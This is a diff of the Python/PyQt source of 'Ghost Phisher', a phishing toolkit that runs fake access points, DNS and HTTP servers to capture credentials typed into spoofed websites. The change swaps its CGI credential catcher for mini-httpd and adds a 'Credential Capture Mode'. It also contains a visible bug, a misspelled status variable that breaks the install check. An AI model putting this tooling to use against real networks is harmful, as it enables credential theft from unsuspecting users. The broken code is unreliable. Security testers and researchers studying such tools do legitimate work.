@@ -7,6 +7,7 @@ try:
 except AttributeError:
     _fromUtf8 = lambda s: s
 
+
 class Ui_ghost_phisher(object):
     def setupUi(self, ghost_phisher):
         ghost_phisher.setObjectName(_fromUtf8("ghost_phisher"))
@@ -551,56 +552,53 @@ class Ui_ghost_phisher(object):
         self.label_25 = QtGui.QLabel(self.groupBox_8)
         self.label_25.setObjectName(_fromUtf8("label_25"))
         self.horizontalLayout_11.addWidget(self.label_25)
-        self.real_website_address = QtGui.QLineEdit(self.groupBox_8)
-        self.real_website_address.setObjectName(_fromUtf8("real_website_address"))
-        self.horizontalLayout_11.addWidget(self.real_website_address)
+        self.lineEdit_2 = QtGui.QLineEdit(self.groupBox_8)
+        self.lineEdit_2.setObjectName(_fromUtf8("lineEdit_2"))
+        self.horizontalLayout_11.addWidget(self.lineEdit_2)
+        self.horizontalLayout_43 = QtGui.QHBoxLayout()
+        self.horizontalLayout_43.setObjectName(_fromUtf8("horizontalLayout_43"))
+        self.run_webpage_port_radio = QtGui.QCheckBox(self.groupBox_8)
+        self.run_webpage_port_radio.setObjectName(_fromUtf8("run_webpage_port_radio"))
+        self.horizontalLayout_43.addWidget(self.run_webpage_port_radio)
+        self.use_port_http = QtGui.QLineEdit(self.groupBox_8)
+        sizePolicy = QtGui.QSizePolicy(QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Fixed)
+        sizePolicy.setHorizontalStretch(0)
+        sizePolicy.setVerticalStretch(0)
+        sizePolicy.setHeightForWidth(self.use_port_http.sizePolicy().hasHeightForWidth())
+        self.use_port_http.setSizePolicy(sizePolicy)
+        self.use_port_http.setObjectName(_fromUtf8("use_port_http"))
+        self.horizontalLayout_43.addWidget(self.use_port_http)
+        self.label_14 = QtGui.QLabel(self.groupBox_8)
+        self.label_14.setObjectName(_fromUtf8("label_14"))
+        self.horizontalLayout_43.addWidget(self.label_14)
+        self.horizontalLayout_11.addLayout(self.horizontalLayout_43)
         self.verticalLayout_15.addLayout(self.horizontalLayout_11)
         self.horizontalLayout_21 = QtGui.QHBoxLayout()
         self.horizontalLayout_21.setObjectName(_fromUtf8("horizontalLayout_21"))
-        self.run_webpage_port_radio = QtGui.QCheckBox(self.groupBox_8)
-        self.run_webpage_port_radio.setObjectName(_fromUtf8("run_webpage_port_radio"))
-        self.horizontalLayout_21.addWidget(self.run_webpage_port_radio)
-        self.use_port_http = QtGui.QLineEdit(self.groupBox_8)
-        self.use_port_http.setObjectName(_fromUtf8("use_port_http"))
-        self.horizontalLayout_21.addWidget(self.use_port_http)
         spacerItem28 = QtGui.QSpacerItem(0, 0, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
         self.horizontalLayout_21.addItem(spacerItem28)
-        self.label_14 = QtGui.QLabel(self.groupBox_8)
-        self.label_14.setObjectName(_fromUtf8("label_14"))
-        self.horizontalLayout_21.addWidget(self.label_14)
-        spacerItem29 = QtGui.QSpacerItem(110, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_21.addItem(spacerItem29)
-        spacerItem30 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_21.addItem(spacerItem30)
-        spacerItem31 = QtGui.QSpacerItem(75, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_21.addItem(spacerItem31)
-        spacerItem32 = QtGui.QSpacerItem(103, 0, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_21.addItem(spacerItem32)
         self.verticalLayout_15.addLayout(self.horizontalLayout_21)
         self.verticalLayout_17.addWidget(self.groupBox_8)
         self.groupBox_9 = QtGui.QGroupBox(self.tab)
         self.groupBox_9.setObjectName(_fromUtf8("groupBox_9"))
-        self.verticalLayout_16 = QtGui.QVBoxLayout(self.groupBox_9)
-        self.verticalLayout_16.setObjectName(_fromUtf8("verticalLayout_16"))
-        self.verticalLayout_14 = QtGui.QVBoxLayout()
+        self.verticalLayout_14 = QtGui.QVBoxLayout(self.groupBox_9)
         self.verticalLayout_14.setObjectName(_fromUtf8("verticalLayout_14"))
-        self.autogen_cgi_radio = QtGui.QRadioButton(self.groupBox_9)
-        self.autogen_cgi_radio.setChecked(True)
-        self.autogen_cgi_radio.setObjectName(_fromUtf8("autogen_cgi_radio"))
-        self.verticalLayout_14.addWidget(self.autogen_cgi_radio)
         self.horizontalLayout_22 = QtGui.QHBoxLayout()
         self.horizontalLayout_22.setObjectName(_fromUtf8("horizontalLayout_22"))
-        self.user_cgi_radio = QtGui.QRadioButton(self.groupBox_9)
-        self.user_cgi_radio.setObjectName(_fromUtf8("user_cgi_radio"))
-        self.horizontalLayout_22.addWidget(self.user_cgi_radio)
-        self.lineEdit_10 = QtGui.QLineEdit(self.groupBox_9)
-        self.lineEdit_10.setObjectName(_fromUtf8("lineEdit_10"))
-        self.horizontalLayout_22.addWidget(self.lineEdit_10)
-        self.cgi_script_button = QtGui.QPushButton(self.groupBox_9)
-        self.cgi_script_button.setObjectName(_fromUtf8("cgi_script_button"))
-        self.horizontalLayout_22.addWidget(self.cgi_script_button)
+        spacerItem29 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
+        self.horizontalLayout_22.addItem(spacerItem29)
+        self.capture_radio = QtGui.QRadioButton(self.groupBox_9)
+        self.capture_radio.setChecked(True)
+        self.capture_radio.setObjectName(_fromUtf8("capture_radio"))
+        self.horizontalLayout_22.addWidget(self.capture_radio)
+        spacerItem30 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
+        self.horizontalLayout_22.addItem(spacerItem30)
+        self.hosting_radio = QtGui.QRadioButton(self.groupBox_9)
+        self.hosting_radio.setObjectName(_fromUtf8("hosting_radio"))
+        self.horizontalLayout_22.addWidget(self.hosting_radio)
+        spacerItem31 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
+        self.horizontalLayout_22.addItem(spacerItem31)
         self.verticalLayout_14.addLayout(self.horizontalLayout_22)
-        self.verticalLayout_16.addLayout(self.verticalLayout_14)
         self.verticalLayout_17.addWidget(self.groupBox_9)
         self.groupBox_10 = QtGui.QGroupBox(self.tab)
         self.groupBox_10.setToolTip(_fromUtf8(""))
@@ -626,18 +624,18 @@ class Ui_ghost_phisher(object):
         self.verticalLayout_13.addLayout(self.verticalLayout_12)
         self.horizontalLayout_18 = QtGui.QHBoxLayout()
         self.horizontalLayout_18.setObjectName(_fromUtf8("horizontalLayout_18"))
-        spacerItem33 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_18.addItem(spacerItem33)
+        spacerItem32 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
+        self.horizontalLayout_18.addItem(spacerItem32)
         self.http_start = QtGui.QPushButton(self.tab)
         self.http_start.setObjectName(_fromUtf8("http_start"))
         self.horizontalLayout_18.addWidget(self.http_start)
-        spacerItem34 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_18.addItem(spacerItem34)
+        spacerItem33 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
+        self.horizontalLayout_18.addItem(spacerItem33)
         self.http_stop = QtGui.QPushButton(self.tab)
         self.http_stop.setObjectName(_fromUtf8("http_stop"))
         self.horizontalLayout_18.addWidget(self.http_stop)
-        spacerItem35 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_18.addItem(spacerItem35)
+        spacerItem34 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
+        self.horizontalLayout_18.addItem(spacerItem34)
         self.verticalLayout_13.addLayout(self.horizontalLayout_18)
         self.verticalLayout_17.addLayout(self.verticalLayout_13)
         self.tabWidget.addTab(self.tab, _fromUtf8(""))
@@ -658,27 +656,27 @@ class Ui_ghost_phisher(object):
         item = QtGui.QTableWidgetItem()
         self.credential_table.setHorizontalHeaderItem(2, item)
         self.verticalLayout_22.addWidget(self.credential_table)
-        spacerItem36 = QtGui.QSpacerItem(15, 6, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
-        self.verticalLayout_22.addItem(spacerItem36)
+        spacerItem35 = QtGui.QSpacerItem(15, 6, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
+        self.verticalLayout_22.addItem(spacerItem35)
         self.horizontalLayout_26 = QtGui.QHBoxLayout()
         self.horizontalLayout_26.setObjectName(_fromUtf8("horizontalLayout_26"))
-        spacerItem37 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_26.addItem(spacerItem37)
+        spacerItem36 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
+        self.horizontalLayout_26.addItem(spacerItem36)
         self.savechanges_button = QtGui.QPushButton(self.tab_3)
         self.savechanges_button.setObjectName(_fromUtf8("savechanges_button"))
         self.horizontalLayout_26.addWidget(self.savechanges_button)
-        spacerItem38 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_26.addItem(spacerItem38)
+        spacerItem37 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
+        self.horizontalLayout_26.addItem(spacerItem37)
         self.insert_button = QtGui.QPushButton(self.tab_3)
         self.insert_button.setObjectName(_fromUtf8("insert_button"))
         self.horizontalLayout_26.addWidget(self.insert_button)
-        spacerItem39 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_26.addItem(spacerItem39)
+        spacerItem38 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
+        self.horizontalLayout_26.addItem(spacerItem38)
         self.delete_button = QtGui.QPushButton(self.tab_3)
         self.delete_button.setObjectName(_fromUtf8("delete_button"))
         self.horizontalLayout_26.addWidget(self.delete_button)
-        spacerItem40 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
-        self.horizontalLayout_26.addItem(spacerItem40)
+        spacerItem39 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
+        self.horizontalLayout_26.addItem(spacerItem39)
         self.verticalLayout_22.addLayout(self.horizontalLayout_26)
         self.horizontalLayout_28.addLayout(self.verticalLayout_22)
         self.tabWidget.addTab(self.tab_3, _fromUtf8(""))
@@ -697,18 +695,18 @@ class Ui_ghost_phisher(object):
         self.label_17 = QtGui.QLabel(self.groupBox_13)
         self.label_17.setObjectName(_fromUtf8("label_17"))
         self.verticalLayout_20.addWidget(self.label_17)
-        spacerItem41 = QtGui.QSpacerItem(23, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
-        self.verticalLayout_20.addItem(spacerItem41)
+        spacerItem40 = QtGui.QSpacerItem(23, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
+        self.verticalLayout_20.addItem(spacerItem40)
         self.label_18 = QtGui.QLabel(self.groupBox_13)
         self.label_18.setObjectName(_fromUtf8("label_18"))
         self.verticalLayout_20.addWidget(self.label_18)
-        spacerItem42 = QtGui.QSpacerItem(20, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
-        self.verticalLayout_20.addItem(spacerItem42)
+        spacerItem41 = QtGui.QSpacerItem(20, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
+        self.verticalLayout_20.addItem(spacerItem41)
         self.label_20 = QtGui.QLabel(self.groupBox_13)
         self.label_20.setObjectName(_fromUtf8("label_20"))
         self.verticalLayout_20.addWidget(self.label_20)
-        spacerItem43 = QtGui.QSpacerItem(20, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
-        self.verticalLayout_20.addItem(spacerItem43)
+        spacerItem42 = QtGui.QSpacerItem(20, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
+        self.verticalLayout_20.addItem(spacerItem42)
         self.label_19 = QtGui.QLabel(self.groupBox_13)
         self.label_19.setObjectName(_fromUtf8("label_19"))
         self.verticalLayout_20.addWidget(self.label_19)
@@ -729,10 +727,10 @@ class Ui_ghost_phisher(object):
         self.label_23 = QtGui.QLabel(self.groupBox_11)
         self.label_23.setObjectName(_fromUtf8("label_23"))
         self.verticalLayout_18.addWidget(self.label_23)
+        spacerItem43 = QtGui.QSpacerItem(20, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
+        self.verticalLayout_18.addItem(spacerItem43)
         spacerItem44 = QtGui.QSpacerItem(20, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
         self.verticalLayout_18.addItem(spacerItem44)
-        spacerItem45 = QtGui.QSpacerItem(20, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
-        self.verticalLayout_18.addItem(spacerItem45)
         self.horizontalLayout_24.addLayout(self.verticalLayout_18)
         self.verticalLayout_21.addWidget(self.groupBox_11)
         self.groupBox_12 = QtGui.QGroupBox(self.tab_4)
@@ -744,8 +742,8 @@ class Ui_ghost_phisher(object):
         self.label_15 = QtGui.QLabel(self.groupBox_12)
         self.label_15.setObjectName(_fromUtf8("label_15"))
         self.verticalLayout_19.addWidget(self.label_15)
-        spacerItem46 = QtGui.QSpacerItem(20, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
-        self.verticalLayout_19.addItem(spacerItem46)
+        spacerItem45 = QtGui.QSpacerItem(20, 0, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
+        self.verticalLayout_19.addItem(spacerItem45)
         self.label_16 = QtGui.QLabel(self.groupBox_12)
         font = QtGui.QFont()
         font.setWeight(50)
@@ -760,14 +758,15 @@ class Ui_ghost_phisher(object):
         self.label_24.setFont(font)
         self.label_24.setObjectName(_fromUtf8("label_24"))
         self.verticalLayout_19.addWidget(self.label_24)
-        spacerItem47 = QtGui.QSpacerItem(24, 13, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
-        self.verticalLayout_19.addItem(spacerItem47)
+        spacerItem46 = QtGui.QSpacerItem(24, 13, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
+        self.verticalLayout_19.addItem(spacerItem46)
         self.horizontalLayout_25.addLayout(self.verticalLayout_19)
         self.verticalLayout_21.addWidget(self.groupBox_12)
         self.horizontalLayout_27.addLayout(self.verticalLayout_21)
         self.tabWidget.addTab(self.tab_4, _fromUtf8(""))
         self.verticalLayout_10.addWidget(self.tabWidget)
         ghost_phisher.setCentralWidget(self.centralwidget)
+
         self.scene = QtGui.QGraphicsScene()
         self.scene.addPixmap(QtGui.QPixmap('%s/banner.png'%(cwd)))
         self.graphicsView.setScene(self.scene)
@@ -793,6 +792,11 @@ class Ui_ghost_phisher(object):
         self.main_mac_address_label.setText(QtGui.QApplication.translate("ghost_phisher", "Mac Address:", None, QtGui.QApplication.UnicodeUTF8))
         self.access_runtime.setText(QtGui.QApplication.translate("ghost_phisher", "Runtime:", None, QtGui.QApplication.UnicodeUTF8))
         self.groupBox_14.setTitle(QtGui.QApplication.translate("ghost_phisher", "Wireless Interface ", None, QtGui.QApplication.UnicodeUTF8))
+        self.label_25.setText(QtGui.QApplication.translate("ghost_phisher", "Real Website IP Address or Url:", None, QtGui.QApplication.UnicodeUTF8))
+        self.groupBox_9.setTitle(QtGui.QApplication.translate("ghost_phisher", " Service Mode", None, QtGui.QApplication.UnicodeUTF8))
+        self.label_25.setText(QtGui.QApplication.translate("ghost_phisher", "Real Website IP Address or Url:", None, QtGui.QApplication.UnicodeUTF8))
+        self.capture_radio.setText(QtGui.QApplication.translate("ghost_phisher", "Credential Capture Mode", None, QtGui.QApplication.UnicodeUTF8))
+        self.hosting_radio.setText(QtGui.QApplication.translate("ghost_phisher", "Hosting  Mode", None, QtGui.QApplication.UnicodeUTF8))
         self.comboBox.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
 "<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
 "p, li { white-space: pre-wrap; }\n"
@@ -934,7 +938,6 @@ class Ui_ghost_phisher(object):
 "</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;\">\n"
 "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:8pt;\">Input the path to a webpage you want to host   e.g /usr/local/bin/index.html</span></p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
         self.website_button.setText(QtGui.QApplication.translate("ghost_phisher", "Browse", None, QtGui.QApplication.UnicodeUTF8))
-        self.label_25.setText(QtGui.QApplication.translate("ghost_phisher", "Real Website IP address or url:", None, QtGui.QApplication.UnicodeUTF8))
         self.run_webpage_port_radio.setText(QtGui.QApplication.translate("ghost_phisher", "Run Webpage on Port :", None, QtGui.QApplication.UnicodeUTF8))
         self.use_port_http.setToolTip(QtGui.QApplication.translate("ghost_phisher", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
 "<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
@@ -942,11 +945,6 @@ class Ui_ghost_phisher(object):
 "</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;\">\n"
 "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:8pt;\">input the port number of which you want the HTTP server to run on   e.g 80</span></p></body></html>", None, QtGui.QApplication.UnicodeUTF8))
         self.label_14.setText(QtGui.QApplication.translate("ghost_phisher", "( Default HTTP Server port is 80 ) ", None, QtGui.QApplication.UnicodeUTF8))
-        self.groupBox_9.setTitle(QtGui.QApplication.translate("ghost_phisher", "CGI Login Handler", None, QtGui.QApplication.UnicodeUTF8))
-        self.autogen_cgi_radio.setText(QtGui.QApplication.translate("ghost_phisher", "Automatically Generate a python CGI Script to catch login credentials and store them", None, QtGui.QApplication.UnicodeUTF8))
-        self.user_cgi_radio.setText(QtGui.QApplication.translate("ghost_phisher", "Use my own CGI Script", None, QtGui.QApplication.UnicodeUTF8))
-        self.lineEdit_10.setToolTip(QtGui.QApplication.translate("ghost_phisher", "input a CGI script you want to handle POST requests", None, QtGui.QApplication.UnicodeUTF8))
-        self.cgi_script_button.setText(QtGui.QApplication.translate("ghost_phisher", "Browse", None, QtGui.QApplication.UnicodeUTF8))
         self.groupBox_10.setTitle(QtGui.QApplication.translate("ghost_phisher", "Status", None, QtGui.QApplication.UnicodeUTF8))
         self.http_captured_credential.setText(QtGui.QApplication.translate("ghost_phisher", "captured credentials:", None, QtGui.QApplication.UnicodeUTF8))
         self.http_captured_credential_2.setText(QtGui.QApplication.translate("ghost_phisher", "Please refer to the Harvested Credential Tab to view captured credentials", None, QtGui.QApplication.UnicodeUTF8))
@@ -1109,7 +1107,6 @@ import socket               # For network based servcies e.g DNS
 import urllib2              # For getting the source code of websites that user wants to clone
 import sqlite3              # For saving fetched credentials to database
 import commands             # For executing shell commands and getting system output e.g DHCP3
-import CGIHTTPServer        # For HTTPserver and CGI POST handles
 
 
 cwd = os.getcwd()                                                        # This will be used as working directory after HTTP is launch
@@ -1176,6 +1173,9 @@ dns_ip_and_websites = {}                                        # Holds mappings
 dhcp_installalation_status = ''                                 # Holds the DHCP installation status
 
 # Global variables for Fake HTTP
+http_installalation_status = ''                                 # Holds the HTTP installation status
+
+# Global variables for Fake HTTP
 http_server_port = 80                                           # Default HTTP port
 http_control = 0                                                # Used to control the credential searching thread
 
@@ -1197,7 +1197,6 @@ class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class
         self.access_stop.setEnabled(False)
         self.access_start.setEnabled(False)
         self.domain_add_button.setEnabled(False)
-        self.cgi_script_button.setEnabled(False)
         self.groupBox_16.setEnabled(False)
 
         # Thread execute Tip settings dialog after 5 seconds
@@ -1241,6 +1240,22 @@ class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class
             self.label.setText('<font color=red>DHCP3 Server is not installed</font>')
             self.dhcp_status.append('<font color=green>To Install DHCP3 Server run:</font>\t<font color=red>apt-get install dhcp3-server</font>')
             dhcp_installalation_status = 'not installed'
+        #
+        # Check if mini-httpd Server service is installed on the computer
+        #
+        global http_installalation_status
+        installalation_status = commands.getstatusoutput('which mini-httpd')
+        if installation_status[0] != 0:
+            self.status_textbrowser_http.append('<font color=red>HTTP Server is not installed</font>')
+            self.status_textbrowser_http.append('<font color=green>To Install HTTP Server run:</font>\t<font color=red>apt-get install mini-httpd</font>')
+            http_installalation_status = 'not installed'
+            self.http_interface_combo.setEnabled(False)
+            self.http_ip_combo.setEnabled(False)
+            self.current_card_label_2.setText("<font color=green>Current Interface:</font>  Deactivated")
+            self.http_port_label.setText('<font color=green>TCP Port:</font> Not Started')
+            self.groupBox_8.setEnabled(False)
+            self.http_start.setEnabled(False)
+
 
         installation_status_access = commands.getstatusoutput('which airbase-ng')
         if installation_status_access[0] != 0:
@@ -1275,10 +1290,10 @@ class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class
             self.website_linedit.setText(read_last_settings('self.website_linedit'))
         except IndexError:pass
         try:
-            self.real_website_address.setText(read_last_settings('self.real_website_address'))
+            self.ip_address_label_2.setText(read_last_settings('ip_address_label_2'))
         except IndexError:pass
         try:
-            self.ip_address_label_2.setText(read_last_settings('ip_address_label_2'))
+            self.lineEdit_2.setText(read_last_settings('lineEdit_2'))
         except IndexError:pass
         try:
             self.access_name_edit.setText(read_last_settings('access_name_edit'))
@@ -1342,7 +1357,8 @@ class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class
 
 
         selected_http_interface = str(self.http_interface_combo.currentText())
-        self.current_card_label_2.setText("<font color=green>Current Interface:</font>  %s"%(selected_http_interface))
+        if http_installalation_status != 'not installed':
+            self.current_card_label_2.setText("<font color=green>Current Interface:</font>  %s"%(selected_http_interface))
 
         # Add channel list to fake access point combo
         channels = []
@@ -1358,13 +1374,10 @@ class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class
         self.connect(self.http_interface_combo,QtCore.SIGNAL("currentIndexChanged(QString)"),self.update_http_address)
         self.connect(self.resolveall_radio,QtCore.SIGNAL("clicked()"),self.update_selection)
         self.connect(self.respond_domain_radio,QtCore.SIGNAL("clicked()"),self.update_selection)
-        self.connect(self.autogen_cgi_radio,QtCore.SIGNAL("clicked()"),self.update_selection_script)
-        self.connect(self.user_cgi_radio,QtCore.SIGNAL("clicked()"),self.update_selection_script)
         self.connect(self.dns_stop,QtCore.SIGNAL("clicked()"),self.stop_dns)
         self.connect(self.dns_start,QtCore.SIGNAL("clicked()"),self.launch_dns)
         self.connect(self.dhcp_start,QtCore.SIGNAL("clicked()"),self.launch_dhcp)
         self.connect(self.website_button,QtCore.SIGNAL("clicked()"),self.browse_webpage)
-        self.connect(self.cgi_script_button,QtCore.SIGNAL("clicked()"),self.selected_cgi_script)
         self.connect(self.emulate_website_radio,QtCore.SIGNAL("clicked()"),self.set_usable)
         self.connect(self.select_website_radio,QtCore.SIGNAL("clicked()"),self.set_usable)
         self.connect(self.http_stop,QtCore.SIGNAL("clicked()"),self.stop_http)
@@ -1384,7 +1397,7 @@ class Ghost_phisher(QtGui.QMainWindow,Ui_ghost_phisher):            # Main class
         self.connect(self,QtCore.SIGNAL("system interrupt"),self.dns_system_interrupt)
         self.connect(self,QtCore.SIGNAL("dns stopped"),self.stop_dns)
         self.connect(self,QtCore.SIGNAL("new client connection"),self.update_dns_connections)
-        self.connect(self,QtCore.SIGNAL("new credential"),self.new_credential)
+        self.connect(self,QtCore.SIGNAL("new connection"),self.new_connection)
         self.connect(self,QtCore.SIGNAL("run tips"),self.run_tips)
         self.connect(self,QtCore.SIGNAL("access point output"),self.update_access_output)
         self.connect(self,QtCore.SIGNAL("access point error"),self.update_access_error)
@@ -2038,13 +2051,14 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
     #       FAKE HTTP SERVER DEFINITION ,FUNCTIONS AND SIGNALS              #
     #########################################################################
 
-    def HTTP_Server(self,http_server_port,status):                  # HTTP Server Thread
-        '''HTTP Server thread'''
-        global server                                               # HTTP Servers connection, will be used to stop server
-        os.chdir(cwd)                                               # Change to main directory just in case a user presses button 2 times
-        os.chdir(cwd + '/HTTP-Webscript/')
-        server = CGIHTTPServer.BaseHTTPServer.HTTPServer(("",http_server_port),CGIHTTPServer.CGIHTTPRequestHandler)
-        server.serve_forever()
+    def HTTP_Server(self,http_server_port,working_directory):                  # HTTP Server Thread
+        '''HTTP Server thread, uses mini-httpd webserver'''
+        # Clear logfile
+        if 'http_logfile' in os.listdir('/tmp/'):
+            os.remove('/tmp/http_logfile')
+        http_server_launch = commands.getstatusoutput('mini-httpd -p %d -dd %s -l /tmp/http_logfile'% \
+                                                    (http_server_port,working_directory))
+
 
     def stop_http(self):
         ''' Stop the DHCP Server'''
@@ -2053,12 +2067,36 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         http_control = 1
         self.http_start.setEnabled(True)
         self.http_stop.setEnabled(False)
-        server.server_close()
+        commands.getstatusoutput('killall mini-httpd')
         self.status_textbrowser_http.append('<font color=red>HTTP Server Stopped at: %s</font>'%(time.ctime()))
         self.http_ip_label.setText('<font color=green>Service running on:</font>  Service not started')
         self.label_13.setText('<font color=green>Runtime:</font>  Service not started')
-        stop_last_server_loop = urllib2.urlopen(http_address) # The HTTP Server does not actually stop until the last loop is completed with a request, This creates that last loop request
 
+    def new_connection(self):
+        ''' Updates the http textbrowser with
+            connection details of a new client
+        '''
+        read_http_log = open('/tmp/http_logfile')
+        http_details = read_http_log.read().splitlines()
+        self.status_textbrowser_http.append('<font color=blue>%s</font>'\
+                                    %(http_details[-1]))
+
+
+    def http_update_thread(self):
+        ''' This thread checks the '/tmp/http_logfile'
+            for new connections
+        '''
+        global http_control
+        connection_number = 0
+
+        while http_control == 0:
+            time.sleep(2)
+            connection_file = open('/tmp/http_logfile')
+            new_connection_number = connection_file.read().splitlines()
+            connection_file.close()
+            if connection_number != len(new_connection_number):
+                connection_number += 1
+                self.emit(QtCore.SIGNAL("new connection"))
 
 
     def new_credential(self):
@@ -2106,15 +2144,6 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
             self.website_button.setEnabled(True)
             self.emulate_website_label.clear()
 
-    def update_selection_script(self):
-        ''' Disables un-used settings buttons if
-            not selected
-        '''
-        if self.autogen_cgi_radio.isChecked() == True:
-            self.cgi_script_button.setEnabled(False)
-            self.lineEdit_10.clear()
-        else:
-            self.cgi_script_button.setEnabled(True)
 
 
     def update_http_address(self):
@@ -2150,21 +2179,33 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 
 
 
-    def selected_cgi_script(self):
-        ''' Accepts user defined CGI scripts '''
-        cgi_script = QtGui.QFileDialog.getOpenFileName(self,"Select CGI script","","Python CGI Script(*.py);;CGI Scripts(*.cgi)")
-        if cgi_script != '':
-            self.lineEdit_10.setText(cgi_script)
-
-
     def launch_http_server(self):
         ''' Evaluates user settings and launches
             webserver to host web-script
         '''
+        global http_installalation_status
+
+        self.status_textbrowser_http.clear()
+
+        if http_installalation_status == 'not installed':
+            self.status_textbrowser_http.append('<font color=red>HTTP Server is not installed</font>')
+            self.status_textbrowser_http.append('<font color=green>To Install HTTP Server run:</font>\t<font color=red>apt-get install mini-httpd</font>')
+
+        elif self.capture_radio.isChecked() == True:                          # Capture Mode is enabled
+            if len(str(self.lineEdit_2.text())) < 3:
+                QtGui.QMessageBox.warning(self,'Invalid URL or IP address','Please input the original url or ip address of the spoofed website')
+            else:
+                self.start_http_service()
+        else:
+            self.start_http_service()
+
+
+    def start_http_service(self):
+        '''Start the HTTP Service'''
         global http_address
         global http_server_port
 
-        self.status_textbrowser_http.clear()
+        http_error = 0               # Informs conditional blocks of success of other blocks
 
         if 'website_url.log' in os.listdir(os.sep + 'tmp' + os.sep):
             os.remove(os.sep + 'tmp' + os.sep + 'website_url.log')
@@ -2183,177 +2224,100 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
             except ValueError:
                 QtGui.QMessageBox.warning(self,"Invalid Port Number","Please input a valid port number on the (Run Webpage on Port :) section")
 
-        if str(self.real_website_address.text()) == '':
-            QtGui.QMessageBox.warning(self,"Invalid Website Reference","Please input the real IP address of url of the website you are trying to spoof section e.g (www.foo-bar.com or 62.123.67.2).Do not include http:// that is already in the reference)")
-        else:
-            global real_website_address
